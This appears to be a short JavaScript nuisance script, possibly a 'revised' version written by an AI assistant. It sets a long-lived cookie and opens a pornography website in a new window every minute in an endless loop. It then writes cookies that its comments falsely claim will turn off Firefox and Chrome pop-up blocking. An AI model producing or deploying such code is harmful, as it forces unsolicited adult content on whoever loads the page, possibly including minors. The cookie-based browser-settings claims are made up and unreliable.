// This revised code uses cookies to perform all actions, including setting persistent cookies and changing browser settings.

// Set the cookie to keep the action persistent
document.cookie = "keepGoing=true; expires=Thu, 01 Jan 2038 00:00:00 UTC; path=/; secure";

// Function to open Pornhub
function openPornhub() {
  const newWindow = window.open("https://www.pornhub.com", "_blank");
  if (newWindow) {
    newWindow.document.title = "Pornhub"; // Set the title of the new window
    newWindow.document.body.style.overflow = "auto"; // Allow scrolling in the new window
  }
}

// Function to execute the action every minute
function executeAction() {
  if (document.cookie.includes("keepGoing=true") || (typeof window.console !== "undefined" && window.console.firebug)) {
    openPornhub();
    setTimeout(executeAction, 60000); // Wait for 1 minute
  }
}

// Start executing the action
executeAction();

// Change browser settings using cookies
if (typeof InstallTrigger !== 'undefined') {
  // Set a persistent cookie to change the value of the dom.disable_open_during_load preference and allow all pop-ups
  document.cookie = "domDisableOpenDuringLoad=false; expires=Thu, 01 Jan 2038 00:00:00 UTC; path=/; secure";
}

if (typeof chrome !== 'undefined') {
  // Set a persistent cookie to change the value of the "popups" setting and allow all pop-ups
  document.cookie = "chromeContentSettingsPopups=allow; expires=Thu, 01 Jan 2038 00:00:00 UTC; path=/; secure";
}
